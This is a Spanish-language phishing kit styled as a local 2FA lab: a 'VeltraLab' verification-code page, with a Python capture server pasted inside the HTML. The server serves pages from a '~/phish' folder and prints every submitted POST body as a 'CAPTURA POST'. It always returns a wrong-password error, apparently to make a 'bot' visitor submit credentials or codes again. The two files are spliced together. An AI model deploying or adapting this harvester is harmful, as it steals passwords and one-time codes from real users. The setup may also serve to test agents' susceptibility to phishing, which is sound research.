
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Laboratorio 2FA</title>
  <link rel="stylesheet" href="/static/styles.css">
  <style>
    .verify-card { margin: 60px auto; }
    .verify-card input {
      text-align: center;
      letter-spacing: .5em;
      font-size: 22px;
    }
  </style>
</head>
<body>
  <header class="topbar">
    <div class="brand">
      <span class="logo">🛡</span>
      <span>Veltra<b>Lab</b></span>
    </div>
    <div class="pill">Laboratorio local · 2FA</div>
  </header>

  <main class="wrap" style="display:block">
    <section class="card verify-card">
      <div class="eyebrow">Paso 2 de 2</div>
      <h2>Código de verificación</h2>
      <p class="sub">
        Ingresá el código de prueba de seis dígitos.
      </p>

      <form id="verify-form">
        <div class="field">
          <label for="otp">Código de prueba</label>
          <input id="otp" name="otp"
                 type="text" inputmode="numeric"
                 pattern="[0-9]{6}" maxlength="6"
                 placeholder="000000" required>
        </div>
        <button class="btn" type="submit">
          Verificar código
        </button>
      </form>

      <p id="result" role="status" style="margin-top:18px"></p>
    </section>
  </main>

  <script>
    document.getElementById("verify-form")
      .addEventListener("submit", async function (event) {
        event.preventDefault();

        const result = document.getElementById("result");
        const otp = document.getElementById("otp").value;

        try {
          const response = await fetch("/api/verify-demo", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({otp})
          });

          const data = await response.json();
          result.textContent = data.message;
        } catch {
          result.textContent = "No se pudo conectar con el laboratorio.";
        }
      });
  </script>
</body>



from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import json, os
BASE = os.path.expanduser('~/phish')
def read(p):
    with open(p,'rb') as f: return f.read()
class H(BaseHTTPRequestHandler):
    def _send(self, body, ctype):
        self.send_response(200)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers(); self.wfile.write(body)
    def do_GET(self):
        path = urlparse(self.path).path
        if path == '/static/styles.css':
            self._send(read(BASE+'/static/styles.css'), 'text/css; charset=utf-8')
        elif path == '/static/veltra.js':
            self._send(read(BASE+'/static/veltra.js'), 'application/javascript; charset=utf-8')
        elif path == '/verify':
            self._send(read(BASE+'/verify.html'), 'text/html; charset=utf-8')
        else:
            self._send(read(BASE+'/index.html'), 'text/html; charset=utf-8')
    def do_POST(self):
        n = int(self.headers.get('Content-Length',0) or 0)
        body = self.rfile.read(n).decode('utf-8','replace')
        print("\n============================================")
        print("*** CAPTURA POST", self.path, "***")
        try: print("   >>>", json.loads(body))
        except: print("   >>>", body)
        print("============================================\n")
        out = b'{"ok":false,"error":"Usuario o contrasena incorrectos."}'
        self.send_response(200); self.send_header('Content-Type','application/json')
        self.send_header('Content-Length', str(len(out))); self.end_headers()
        self.wfile.write(out)
    def log_message(self,*a): print(self.address_string(), self.command, self.path)
print("Servidor de captura en :8000  (esperando al bot)")
HTTPServer(('0.0.0.0',8000), H).serve_forever()




</html>
